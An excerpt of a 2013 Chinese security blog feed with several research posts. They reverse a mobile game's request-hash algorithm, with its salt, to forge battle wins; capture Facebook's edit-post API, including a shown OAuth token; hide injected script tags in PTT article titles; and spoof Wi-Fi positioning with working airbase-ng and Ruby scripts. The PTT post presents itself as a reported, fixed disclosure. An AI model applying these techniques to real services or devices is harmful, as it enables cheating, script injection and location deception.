+我發現在 Facebook 打廣告還算有用，真的就是因為他出現贊助在我牆上太多次，才決定下載試試看，而且當我意識到的時候，我已經花了整整一天在轉珠上面了，也難怪神魔之塔版會佔據 PTT 熱門看板前幾名，不是沒有道理 XD
+我喜歡從應用層的協定來了解一款網路遊戲，了解程式和程式間的溝通，總能更了解開發者的思維。身為一個研究僧，動手來看看神魔之塔的 API 吧！</p>
+
+<h1>發現</h1>
+
+<p>一開始錄封包還滿訝異的，因為它是走 HTTP，沒有 SSL/TLS 的狀況下很容易被偷走遊戲資訊，而且其 session 好像大喇喇的出現在 GET 參數裡面，如下面一個取得獎賞清單的請求：</p>
+
+<blockquote><p><a href="http://zh.towerofsaviors.com/api/user/reward/list?uid=400000000&amp;session=21232f297a57a5a743894a0e4a801fc3&amp;language=zh_TW&amp;platform=android&amp;version=3.27&amp;timestamp=1234567890&amp;timezone=8&amp;nData=8d777f385d3dfec8815d20f7496026dc&amp;hash=5f4dcc3b5aa765d61d8327deb882cf99">http://zh.towerofsaviors.com/api/user/reward/list?uid=400000000&amp;session=21232f297a57a5a743894a0e4a801fc3&amp;language=zh_TW&amp;platform=android&amp;version=3.27&amp;timestamp=1234567890&amp;timezone=8&amp;nData=8d777f385d3dfec8815d20f7496026dc&amp;hash=5f4dcc3b5aa765d61d8327deb882cf99</a></p></blockquote>
+
+<p>不過其實神魔之塔這款遊戲帳號被偷走也不太會有影響，畢竟虛擬的卡片也不能流通。影響比較大能想到的就是把其他玩家六星神卡當肥料餵史萊姆。（但有人會這麼無聊嗎？）</p>
+
+<p>神魔之塔的 API 還滿清楚簡單的，結構一目了然。唯一讓我有興趣的，是 hash 那個參數，因為如果對請求做了修改，伺服器就會回傳 <code>Invalid Hash Code.</code>，看起來這串 hash 值是對所有參數做某種演算法的結果。</p>
+
+<p>所以我就翻翻翻，翻到了產生 hash 的演算法：</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>hash = Checksum.GetHash("/api/" + path + URLBuilder.BuildQuery(dictionary, true), string.Empty);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>其中 GetHash 是下面這個樣子。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>public static string GetHash(string input, string salt = "")
+</span><span class='line'>{
+</span><span class='line'>     string str = "YmZhYTRkNzIwM2VkODhhZTZiZTg4MDU2NWFlYjkxMDU=" + salt;
+</span><span class='line'>     string str2 = Encryption.MD5(input).Substring(4, 4);
+</span><span class='line'>     return Encryption.MD5(str2 + str);
+</span><span class='line'>} </span></code></pre></td></tr></table></div></figure>
+
+
+<p>在有了這串 hash 演算法的前提下，可以做的事情好像就很多了，例如說 <strong>自動戰鬥</strong>。</p>
+
+<h1>實作</h1>
+
+<p>為了要證實這樣的想法，我寫了一支程式去測試。模擬戰鬥中的參數，然後送出戰鬥勝利的請求。實作影片如下：</p>
+
+<center><iframe width="640" height="480" src="//www.youtube.com/embed/tW599f_G9yo" frameborder="0" allowfullscreen></iframe></center>
+
+
+<p>這只是一支 POC (Proof of Concepts) 程式，雖然看起來很強大，但就寫到這邊為止了。要不是前兩天陪朋友們去參加比賽，我順便去練練程式，不然這應該永遠只是一個 concept 而已。
+利用同樣的前提，以下還有其他猜想，但我已經不會去驗證了：
+- 感覺夠做到自動化首抽，應該可以不受官方開新帳號的限制
+- 例如在戰鬥中回合次數改成 9999，不知道會不會把 skill 等級提昇</p>
+
+<h1>結論</h1>
+
+<p>本篇從神魔之塔 API 的角度出發，嘗試了解參數的意義，並實作程式自動化戰鬥。
+從這件事情也學習到，在開發者的角度，有必要在重要的加密程序上做一些混淆，可以增加有心人解析的困難度。</p>
+
+<p>我能夠預料到這篇文章寫出來有些人可能會有問題想問，但這只是我突發奇想做的事情，也不會繼續研究下去，所以請原諒我不會在這篇文章下回應留言。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Facebook 修改文章 API]]></title>
+    <link href="http://tech.shaolin.tw/posts/2013/09/21/facebook-edit-post-api/"/>
+    <updated>2013-09-21T08:48:00+08:00</updated>
+    <id>http://tech.shaolin.tw/posts/2013/09/21/facebook-edit-post-api</id>
+    <content type="html"><![CDATA[<h1>前言</h1>
+
+<p>前幾天發現手機版 Facebook 多出了『編輯貼文』的功能，才發現最近 Facebook Android App Beta 3.7 版本多了一個 feature：Edit your posts and comments, and tap to see all your changes。目前網頁介面都還沒有看到可以編輯貼文的地方，這很特別，一個 web 起家的服務推出新功能是先從手機版開始！</p>
+
+<p><img src="http://user-image.logdown.io/user/264/blog/264/post/141216/9KIBIrH7S72zsGYYj0kX_facebook_android_edit_post.png" alt="facebook_android_edit_post.png" /></p>
+
+<p>編輯貼文的功能大家已經期待很久，我特別好奇它的 API 是長什麼樣子，想看看是不是有機會讓 web 版也能搶先使用，所以就從 Facebook 手機端應用程式抓出修改文章的 API，與大家分享。</p>
+
+<h1>Facebook Edit Post API</h1>
+
+<p>完整的 HTTP request 如下：</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>POST https://graph.facebook.com/
+</span><span class='line'>Authorization: OAuth CAACEdEose0cBAPWltYXWoy3oTEyNmbtqM51q5w0NSwKcTy9HzZnB7CfrWpFoGYMVhv84UadAX6xmck5si23bwTtKPyDESRjquegLJNQDTGcxAzt749pdPqjv56i8FVN3osfSry2hBQKZWeUYngwMabEmHukRCLJXe5ksqvdfCB3YU6yz4uGnHK8gFbSx7TRhMt9a2AZJLEpPmWNrQD
+</span><span class='line'>Host: graph.facebook.com
+</span><span class='line'>Accept-Encoding: gzip
+</span><span class='line'>User-Agent: [FBAN/FB4A;FBAV/3.7;FBBV/353711;FBDM/{density=1.5,width=480,height=800};FBLC/zh_TW;FBCR/&#20013-&#33775-&#38651-&#20449-;FBPN/com.facebook.katana;FBDV/HTC Incredible S;FBSV/4.0.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]
+</span><span class='line'>Content-Type: multipart/form-data; boundary=_--5h40l1n47D3VC0RE
+</span><span class='line'>--_--5h40l1n47D3VC0RE
+</span><span class='line'>Content-Disposition: form-data; name="batch"
+</span><span class='line'>Content-Type: text/plain; charset=UTF-8
+</span><span class='line'>Content-Transfer-Encoding: 8bit
+</span><span class='line'>
+</span><span class='line'>[{"method":"POST","body":"message=after+edit&format=json","name":"editPost","omit_response_on_success":false,"relative_url":"820574444_10151876422189445"}]
+</span><span class='line'>--_--5h40l1n47D3VC0RE--</span></code></pre></td></tr></table></div></figure>
+
+
+<p>使用上需要修改的是 <code>Authorization</code>、POST 裡面的 <code>message</code> 和 <code>relative_url</code> 三個地方。
+<strong>Authorization</strong>：OAuth 後面接的是 Access Token，可以到 <a href="https://developers.facebook.com/tools/explorer">Graph API Explorer</a> 去抓一個暫時的來用。
+<strong>message</strong>：這邊放你貼文的新內容。
+<strong>relative_url</strong>：想修改的貼文 object_id，格式是 <code>(發文者的 facebook uid)_(該貼文的 post id)</code>。</p>
+
+<p>以下利用 Firefox 的 add-on : <a href="https://addons.mozilla.org/zh-tw/firefox/addon/httprequester/">HttpRequester</a> 發送 HTTP 請求來修改文章。</p>
+
+<center><iframe width="420" height="315" src="//www.youtube.com/embed/sPq8ye0cnPc" frameborder="0" allowfullscreen></iframe></center>
+
+
+<p>為了實驗能否在 web 端使用，我先在 <a href="https://developers.facebook.com/tools/explorer">Graph API Explorer</a> 測試此 API，發現都會回傳 <code>(#200) User does not have permission to edit this object</code>。</p>
+
+<p><img src="http://user-image.logdown.io/user/264/blog/264/post/141216/7Gjm40fyQPGONQJbifNM_graph_fail.png" alt="graph_fail.png" /></p>
+
+<p>後來才發現這個 API 會認 User-Agent，如果是非手機端的 User-Agent 使用此 API，即使是使用相同的 Access Token，一樣會回傳 <code>(#200) User does not have permission to edit this object</code>。</p>
+
+<p><img src="http://user-image.logdown.io/user/264/blog/264/post/141216/HxDFC67aStSnOLOf9i87_user_agent_change.png" alt="user_agent_change.png" /></p>
+
+<p>至於大家最關心的可能是，如果把 relative_url 的 object id，改成別人的 post id，是不是就可以 <strong>修改別人的貼文</strong> 了呢？傻傻的，同樣的問題 Facebook 都碰過好多次了，有這種想法太天真了！</p>
+
+<p><img src="http://user-image.logdown.io/user/264/blog/264/post/141216/p8I4gMJKRPGKRZZH110S_change_post_id.png" alt="change_post_id.png" /></p>
+
+<p>(嗯..沒錯..天真的是我 XD)</p>
+
+<h1>結論</h1>
+
+<p>Facebook 終於開始在手機端提供修改文章的功能了，可惜的是這個 API 會對 User-Agent 做檢查，不太方便做成 extension 讓大家搶先使用。如果目前有修改文章的需求，使用 Android 吧 :p
+此外，本篇也稍稍的測試了一下前陣子 Facebook 出事的權限管控問題，看起來沒有什麼大問題，哈！</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[在 PTT 插 javascript]]></title>
+    <link href="http://tech.shaolin.tw/posts/2013/08/27/insert-javascript-into-web-ptt/"/>
+    <updated>2013-08-27T17:58:00+08:00</updated>
+    <id>http://tech.shaolin.tw/posts/2013/08/27/insert-javascript-into-web-ptt</id>
+    <content type="html"><![CDATA[<p><strong>註：本文發表時，PTT 官方已經修正這個問題</strong></p>
+
+<h1>前言</h1>
+
+<p>幾天前從 Facebook 上看到一篇 <a href="http://www.ptt.cc/bbs/index.html">PTT</a> 的轉錄文章，因為該篇文章沒有斷行，讓我對 BBS 文章轉 HTML 的 parser 運作產生好奇，然後在研究過程中竟意外發現 PTT 可以插入 javascript：</p>
+
+<p>像這樣在 BBS 標題區塊加入 javascript 的文字
+<img src="http://user-image.logdown.io/user/264/blog/264/post/95148/YT6MlFETQuxVGdu79EZA_bbs_1.png" alt="bbs_1.png" />
+轉成 html 時因為沒有過濾掉，在 web 介面上 javascript 就被正確執行
+<img src="http://user-image.logdown.io/user/264/blog/264/post/95148/5HGitE8bQ8uSavfr11Sk_web_1.png" alt="web_1.png" />
+在 web 介面上看到的原文變成這樣
+<img src="http://user-image.logdown.io/user/264/blog/264/post/95148/liWcCjPgQQOgPud0jms5_web_2.png" alt="web_2.png" /></p>
+
+<p>PTT 的文章常常在 Facebook 被轉載，擁有擴散率高的特性，如果被植入惡意程式，其實影響範圍不小。
+身為目標是維護世界和平的資安研究僧，我開始模擬駭客的思維，猜測駭客可能會關注下面兩點：</p>
+
+<ol>
+<li><p>此弱點可利用的長度，至少要放的下 <code>&lt;script src="http://data.shaolin.tw/js/ptt.js"&gt;&lt;/script&gt; (這是舉例，網址可以更短)</code> 這類的東西才可以做更多事情，不然只是跳出 alert 好像太虛了。</p></li>
+<li><p>猜測駭客都有為善不欲人知的特質，即使在 web 介面上看不出被插了 javascipt，但在 BBS 介面大喇喇的被所有人看到自己在這篇文章插 javascript， 應該會有些害羞吧！</p></li>
+</ol>
+
+
+<p>所以本篇就來想辦法看看有沒有辦法解決上面兩個問題吧！</p>
+
+<h1>思考與實作</h1>
+
+<p>前述第一點弱點可利用的長度應該不是什麼大問題，畢竟整塊作者、標題、時間都存在相同的問題，標題欄位要放個 4X 個字元是很足夠的。重點還是該如何在 BBS 介面不被讓人家發現寫了一長串跟內文無關的東西。</p>
+
+<p>那，該如何在 BBS 文章中隱藏那串怪異的程式碼，又必須把它放到作者、標題、時間那的區塊裡面呢？</p>
+
+<p>第一個想法，是利用鄉民低調最常使用的色碼，希望可以在 script 那串文字上面做出藍底藍字的效果，混在標題列就可以不被人發現有貓膩了。可惜的是，標題那塊不能使用色碼 XD</p>
+
+<p>第二個想法，是利用位移碼 + 色碼，希望能夠在文章內文寫下藍底藍字的 script，然後位移到標題藍色區塊，不但解決了第一個想法中標題區塊不能用色碼的問題，在文章內文寫 script 要多長就有多長也不怕不夠用，這真是太聰明的作法了！！！現在只擔心轉換 html 的程式會不會正確處理位移碼而已了，嗯嗯。
+興奮之餘趕快去測試了一下，痾，位移碼不能用了～～ 年輕人終究是年輕人，太天真惹XD</p>
+
+<p>最後我想到 BBS 一行可以存 512 個字元，而且在標題藍色區塊，超過 78 個字元的部份似乎都不會顯示。所以只要在標題區塊上任一欄向後補空白字元補滿 78 個字元，後面要放什麼東西都隨便，長度很夠，也不會被顯示出來。很簡單的作法，效果也最好！實作的方式如下面的影片：</p>
+
+<iframe width="420" height="315" src="//www.youtube.com/embed/bxDUbhxvqaQ" frameborder="0" allowfullscreen></iframe>
+
+
+<p>至於為什麼不隨便空 n ( n>78 )個空白就好了，而是要剛剛好讓前面是 78 個字元？因為 web 頁面超過 78 個字元就會換行，看起來會很怪，如下圖，藍色區塊多了一行
+<img src="http://user-image.logdown.io/user/264/blog/264/post/95148/llyZudnSY6rZUnrRAvI3_one_more_line.png" alt="one_more_line.png" /></p>
+
+<p>最後成功的 html 長得大概像這樣，要放 iframe 或更多 html tag 都可以了
+<img src="http://user-image.logdown.io/user/264/blog/264/post/95148/k32LGWUaSM21tRmaKWHf_src.png" alt="src.png" /></p>
+
+<h1>結論</h1>
+
+<p>本文首先利用了 PTT 轉 HTML 在標題區塊的小疏忽，在 web PTT 上成功插入了 javascript。
+接著，利用標題區塊在 BBS 上僅顯示前 78 個字元的特性，在 BBS 介面隱藏了惡意的程式碼。
+其實插 javascript 並不是一件稀有的事情，也不需要特別撰文描述，但很少會碰到需要隱藏這些 script 的狀況，所以特別分享之XD</p>
+
+<p>既然都發了這篇文，想要順便提一下一個觀念：『除非真的很確定，否則不要相信任何 input！』。身為程式開發者，當然也會覺得要做到這件事情超麻煩，但在開發的過程中，想想不同的 input 跑到你的程式碼中會變成什麼樣的結果，真的也是一種趣味。而且，這個觀念能帶來的會是安全的程式碼，是應該內化到每個開發者的重要準則阿！</p>
+
+<p>阿對了，我還要說，PTT 修正這個問題的速度超快的啦！寄信沒多久就解了，讚耶！</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Wi-Fi positioning system 欺騙 (2)]]></title>
+    <link href="http://tech.shaolin.tw/posts/2013/08/05/wi-fi-positioning-system-spoofing-2/"/>
+    <updated>2013-08-05T11:00:00+08:00</updated>
+    <id>http://tech.shaolin.tw/posts/2013/08/05/wi-fi-positioning-system-spoofing-2</id>
+    <content type="html"><![CDATA[<h1>前言</h1>
+
+<p>在<a href="http://tech.shaolin.tw/posts/2013/07/13/wi-fi-positioning-system-spoofing-1">上一篇的實驗</a>中，我們能夠透過假造 AP 資訊來欺騙手持裝置，使其地理位置改變。但改變位置到一個定點好像沒有這麼好玩，如果我想要讓位置移動，塑造高超走位！高超走位！的效果呢？今天的主題，就來<strong>讓偽造的地理位置移動起來</strong>吧！</p>
+
+<h1>實作</h1>
+
+<p>話不多說，沒圖沒真相，直接放結果影片：我寫了一個 demo script，每 20 秒會換一次 AP set，所以可以看到手機定位的位置差不多 20 秒會移動一次！</p>
+
+<iframe width="560" height="315" src="//www.youtube.com/embed/NC04TcLNLik" frameborder="0" allowfullscreen></iframe>
+
+
+<p>script 的內容大致如下：</p>
+
+<figure class='code'><figcaption><span>demo.sh</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="c">#!/bin/bash</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">WLANIFACE</span><span class="o">=</span>wlan0   <span class="c"># 網路卡介面</span>
+</span><span class='line'>
+</span><span class='line'>ifconfig <span class="nv">$WLANIFACE</span> down
+</span><span class='line'>iwconfig <span class="nv">$WLANIFACE</span> mode monitor
+</span><span class='line'>ifconfig <span class="nv">$WLANIFACE</span> up
+</span><span class='line'>
+</span><span class='line'><span class="c"># 台灣基督長老教會景美教會</span>
+</span><span class='line'>gnome-terminal -e <span class="s2">&quot;airbase-ng -c 11 -e &#39;OOOOOOOO OOOOOO&#39; -a 12:34:56:cd:bb:ee $WLANIFACE&quot;</span> <span class="p">&amp;</span>
+</span><span class='line'>gnome-terminal -e <span class="s2">&quot;airbase-ng -c 11 -e &#39;PPPPPPPPP_PPPP_PP&#39; -a 00:dd:44:cc:55:66 $WLANIFACE&quot;</span> <span class="p">&amp;</span>
+</span><span class='line'>gnome-terminal -e <span class="s2">&quot;airbase-ng -c 1 -e &#39;UUUUUU&#39; -a aa:11:44:33:aa:cc $WLANIFACE&quot;</span> <span class="p">&amp;</span>
+</span><span class='line'>gnome-terminal -e <span class="s2">&quot;airbase-ng -c 1 -e &#39;HHHHH&#39; -a 34:34:34:27:27:27 $WLANIFACE&quot;</span> <span class="p">&amp;</span>
+</span><span class='line'>gnome-terminal -e <span class="s2">&quot;airbase-ng -c 11 -e &#39;DDD-DDDDD&#39; -a ff:77:88:55:66:11 $WLANIFACE&quot;</span> <span class="p">&amp;</span>
+</span><span class='line'>sleep 20
+</span><span class='line'>killall airbase-ng
+</span><span class='line'>
+</span><span class='line'><span class="c"># 景華公園平面配置圖</span>
+</span><span class='line'>gnome-terminal -e <span class="s2">&quot;airbase-ng -c 6 -e &#39;WWWWW&#39; -a 00:88:22:22:bb:22 $WLANIFACE&quot;</span> <span class="p">&amp;</span>
+</span><span class='line'>gnome-terminal -e <span class="s2">&quot;airbase-ng -c 6 -e &#39;TTT-FFFF&#39; -a 00:11:22:22:44:11 $WLANIFACE&quot;</span> <span class="p">&amp;</span>
+</span><span class='line'>gnome-terminal -e <span class="s2">&quot;airbase-ng -c 7 -e &#39;CCCC hhh&#39; -a 44:77:00:ff:33:aa $WLANIFACE&quot;</span> <span class="p">&amp;</span>
+</span><span class='line'>gnome-terminal -e <span class="s2">&quot;airbase-ng -c 11 -e &#39;HHHH&#39; -a 44:aa:33:cc:dd:44 $WLANIFACE&quot;</span> <span class="p">&amp;</span>
+</span><span class='line'>gnome-terminal -e <span class="s2">&quot;airbase-ng -c 1 -e &#39;1234567&#39; -a 00:00:cc:cc:aa:aa $WLANIFACE&quot;</span> <span class="p">&amp;</span>
+</span><span class='line'>sleep 20
+</span><span class='line'>killall airbase-ng
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>技術層面來說，這只是不斷切換欲偽造地點的 AP 資訊而已，每 20 秒換一次。比較困難的是要如何收集這些 AP 資訊並且變成上面的 shell script，畢竟要手動做這些事情非常的繁瑣，所以我又寫了一支程式解決這個需求：</p>
+
+<figure class='code'><figcaption><span>collect.rb</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
+</span><span class='line'><span class="c1">#encoding: UTF-8</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="n">comment</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">||</span> <span class="s2">&quot;報告學長，完全沒有描述&quot;</span>
+</span><span class='line'><span class="n">collect_count</span> <span class="o">=</span> <span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">||</span> <span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">to_i</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">raw_data</span> <span class="o">=</span> <span class="sb">`/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s`</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># log raw_data</span>
+</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;log/raw.txt&quot;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span>
+</span><span class='line'>  <span class="n">file</span><span class="o">.</span><span class="n">puts</span> <span class="s2">&quot;# </span><span class="si">#{</span><span class="n">comment</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span class='line'>  <span class="n">file</span><span class="o">.</span><span class="n">puts</span> <span class="n">raw_data</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># collect all AP info in hash</span>
+</span><span class='line'><span class="n">lines</span> <span class="o">=</span> <span class="n">raw_data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sr">/[\r\n]/</span><span class="p">)</span>
+</span><span class='line'><span class="n">lines</span><span class="o">.</span><span class="n">shift</span>
+</span><span class='line'><span class="n">wifi_info</span> <span class="o">=</span> <span class="n">lines</span><span class="o">.</span><span class="n">map</span><span class="p">{</span><span class="o">|</span><span class="n">line</span><span class="o">|</span>
+</span><span class='line'>  <span class="k">next</span> <span class="k">if</span> <span class="p">(</span><span class="n">line</span><span class="o">[</span><span class="mi">1</span><span class="o">.</span><span class="n">.</span><span class="mi">32</span><span class="o">].</span><span class="n">nil?</span> <span class="ow">or</span> <span class="n">line</span><span class="o">[</span><span class="mi">33</span><span class="o">.</span><span class="n">.</span><span class="o">-</span><span class="mi">1</span><span class="o">].</span><span class="n">nil?</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">ssid</span>    <span class="o">=</span> <span class="n">line</span><span class="o">[</span><span class="mi">1</span><span class="o">.</span><span class="n">.</span><span class="mi">32</span><span class="o">].</span><span class="n">strip</span>
+</span><span class='line'>  <span class="n">cols</span>    <span class="o">=</span> <span class="n">line</span><span class="o">[</span><span class="mi">33</span><span class="o">.</span><span class="n">.</span><span class="o">-</span><span class="mi">1</span><span class="o">].</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">bssid</span>   <span class="o">=</span> <span class="n">cols</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
+</span><span class='line'>  <span class="n">signal</span>  <span class="o">=</span> <span class="n">cols</span><span class="o">[</span><span class="mi">1</span><span class="o">].</span><span class="n">to_i</span>
+</span><span class='line'>  <span class="n">channel</span> <span class="o">=</span> <span class="n">cols</span><span class="o">[</span><span class="mi">2</span><span class="o">].</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="o">.</span><span class="n">to_i</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="n">signal</span> <span class="o">!=</span> <span class="mi">0</span>
+</span><span class='line'>    <span class="p">{</span> <span class="ss">ssid</span><span class="p">:</span> <span class="n">ssid</span><span class="p">,</span> <span class="ss">bssid</span><span class="p">:</span> <span class="n">bssid</span><span class="p">,</span> <span class="ss">signal</span><span class="p">:</span> <span class="n">signal</span><span class="p">,</span> <span class="ss">channel</span><span class="p">:</span> <span class="n">channel</span><span class="p">}</span>
+</span><span class='line'>  <span class="k">else</span>  <span class="c1"># parse error</span>
+</span><span class='line'>    <span class="k">next</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'><span class="p">}</span><span class="o">.</span><span class="n">compact</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># sort with signal</span>
+</span><span class='line'><span class="n">wifi_info</span><span class="o">.</span><span class="n">sort_by!</span> <span class="p">{</span><span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="n">x</span><span class="o">[</span><span class="ss">:signal</span><span class="o">]</span><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1"># log top n AP info</span>
+</span><span class='line'><span class="n">top_wifi</span> <span class="o">=</span> <span class="n">wifi_info</span><span class="o">.</span><span class="n">reverse</span><span class="o">.</span><span class="n">first</span> <span class="n">collect_count</span>
+</span><span class='line'><span class="nb">puts</span> <span class="n">top_wifi</span>
+</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&quot;log/collect.txt&quot;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span>
+</span><span class='line'>  <span class="n">file</span><span class="o">.</span><span class="n">puts</span> <span class="s2">&quot;# </span><span class="si">#{</span><span class="n">comment</span><span class="si">}</span><span class="s2">&quot;</span>
+</span><span class='line'>  <span class="n">top_wifi</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">info</span><span class="o">|</span>
+</span><span class='line'>    <span class="n">file</span><span class="o">.</span><span class="n">puts</span> <span class="s2">&quot;gnome-terminal -e </span><span class="se">\&quot;</span><span class="s2">airbase-ng -c </span><span class="si">#{</span><span class="n">info</span><span class="o">[</span><span class="ss">:channel</span><span class="o">]</span><span class="si">}</span><span class="s2"> -e &#39;</span><span class="si">#{</span><span class="n">info</span><span class="o">[</span><span class="ss">:ssid</span><span class="o">]</span><span class="si">}</span><span class="s2">&#39; -a </span><span class="si">#{</span><span class="n">info</span><span class="o">[</span><span class="ss">:bssid</span><span class="o">]</span><span class="si">}</span><span class="s2"> $WLANIFACE</span><span class="se">\&quot;</span><span class="s2"> &amp;&quot;</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'>  <span class="n">file</span><span class="o">.</span><span class="n">puts</span> <span class="s2">&quot;sleep 50&quot;</span>
+</span><span class='line'>  <span class="n">file</span><span class="o">.</span><span class="n">puts</span> <span class="s2">&quot;killall airbase-ng&quot;</span>
+</span><span class='line'><span class="k">end</span>
+</span><span class='line'><span class="nb">puts</span> <span class="s2">&quot;已經新增[</span><span class="si">#{</span><span class="n">comment</span><span class="si">}</span><span class="s2">] </span><span class="si">#{</span><span class="n">top_wifi</span><span class="o">.</span><span class="n">size</span><span class="si">}</span><span class="s2"> 筆 AP 資訊&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>這支程式是 Mac Only，執行後會抓出當下周圍的 AP 資訊，並擷取訊號強度前 n 筆(預設是 5 筆)的 AP，輸出成前面的 shell script 樣式。執行時的畫面大概長這樣：</p>
+
+<p><img src="http://user-image.logdown.io/user/264/blog/264/post/74100/0aBwQrWrTfCwGgpmTD9A_wifi_collection.png" alt="wifi_collection.png" /></p>
+
+<h1>結論</h1>
+
+<p>為了滿足我們想要製造手持裝置是在移動中的效果，可以透過持續偽造不同的 AP 來達成。本文提供了一段可以自動化切換偽造 AP 的 script 範例，還有一支用來收集 AP 資訊的程式。這樣一來，即使在家裡也可以在虛擬的世界啪啪造了！至於這到底有什麼實際上的應用，我也還沒有想到就是了 XD</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Wi-Fi positioning system 欺騙 (1)]]></title>
+    <link href="http://tech.shaolin.tw/posts/2013/07/13/wi-fi-positioning-system-spoofing-1/"/>
+    <updated>2013-07-13T12:26:00+08:00</updated>
+    <id>http://tech.shaolin.tw/posts/2013/07/13/wi-fi-positioning-system-spoofing-1</id>
+    <content type="html"><![CDATA[<h1>背景</h1>
+
+<p>目前手機的定位，一般來說有 <strong>全球定位系统(GPS)</strong>、<strong>基地台定位(LBS)</strong>、<strong>wifi定位(WPS)</strong>三種。
